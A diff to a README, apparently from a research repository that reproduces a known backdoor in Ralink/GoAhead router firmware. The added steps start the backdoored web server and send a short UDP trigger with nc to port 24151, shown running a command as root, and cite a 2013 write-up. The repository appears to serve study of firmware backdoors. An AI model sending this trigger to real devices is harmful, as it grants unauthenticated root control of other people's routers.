@@ -15,6 +15,20 @@ command:
 - `0x78`: run any command as root
 
 ## Triggering the backdoor
-First, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
+First, we need to copy the file used as a stand-in for the actual NVRAM to `/tmp`:
 ```console
-$ ./backdoored/
+$ cp ./original/vendors/Ralink/RT3052/RT2860_default_vlan /tmp/
+```
+Then, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
+```console
+$ ./backdoored/user/goahead/src/goahead
+```
+In a separate terminal, we can trigger the backdoor (e.g., to run `id` as root):
+```console
+$ echo -en "rlink_mfg x /bin/id" | nc -u localhost 24151
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+## Reference
+<https://web.archive.org/web/20131020145741/http://www.devttys0.com/2013/10/from-china-with-love>
